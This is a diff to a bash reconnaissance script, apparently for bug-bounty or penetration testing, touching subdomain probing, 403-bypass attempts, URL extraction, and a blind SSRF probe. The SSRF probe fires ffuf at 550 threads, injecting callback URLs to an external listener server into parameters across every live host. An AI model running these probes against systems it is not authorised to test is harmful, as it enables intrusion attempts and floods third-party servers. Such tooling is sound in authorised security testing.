@@ -287,8 +287,6 @@ checkhttprobe(){
         echo "finding math mode done."
       fi
   fi
-
-  # sort -u $TARGETDIR/httpx_output_1.txt $TARGETDIR/httpx_output_2.txt -o $TARGETDIR/3-all-subdomain-live-scheme.txt
   echo "[httpx] done."
 }
 
@@ -296,7 +294,7 @@ bypass403test(){
   echo
   echo "[bypass403] Try bypass 4xx..."
   # xargs -n1 -I {} bypass-403 "{}" "" < "$TARGETDIR/403-all-subdomain-live-scheme.txt"
-  interlace --silent -tL "$TARGETDIR/403-all-subdomain-live-scheme.txt" -threads 50 -c "bypass-403 _target_ ''" 1> $TARGETDIR/403-bypass-output.txt
+  interlace --silent -tL "$TARGETDIR/403-all-subdomain-live-scheme.txt" -threads 50 -c "bypass-403 _target_ ''" | grep -E "\[2[0-9]{2}\]" > $TARGETDIR/403-bypass-output.txt
   echo "[bypass403] done."
 }
 
@@ -327,7 +325,7 @@ pagefetcher(){
     echo
     echo "[page-fetch] Fetch page's DOM..."
     < $TARGETDIR/3-all-subdomain-live-scheme.txt page-fetch -o $TARGETDIR/page-fetched --no-third-party --exclude image/ --exclude css/ 1> /dev/null
-    grep -horE  "https?[^\"\\'> ]+|www[.][^\"\\'> ]+" $TARGETDIR/page-fetched | grep "${SCOPE}" | sort | uniq | qsreplace -a > $TARGETDIR/page-fetched/pagefetcher_output.txt
+    grep -horE "https?:[^\"\\'> ]+|www[.][^\"\\'> ]+" $TARGETDIR/page-fetched | grep "${SCOPE}" | sort | uniq | qsreplace -a > $TARGETDIR/page-fetched/pagefetcher_output.txt
 
     < $TARGETDIR/page-fetched/pagefetcher_output.txt unfurl --unique domains | grep "${SCOPE}" | sort | uniq | \
                   $httpxcall >> $TARGETDIR/3-all-subdomain-live-scheme.txt
@@ -457,7 +455,7 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[SSRF-2] Blind probe..."
-    xargs -n1 -I {} ffuf -v -r -c -t 250 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -n1 -I {} ffuf -v -r -c -t 550 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
@@ -641,6 +639,7 @@ recon(){
   PID_HTTPX=$!
   echo "wait PID_HTTPX=$PID_HTTPX"
   wait $PID_HTTPX
+
   bypass403test $1
 
   if [[ -n "$fuzz" || -n "$brute" ]]; then
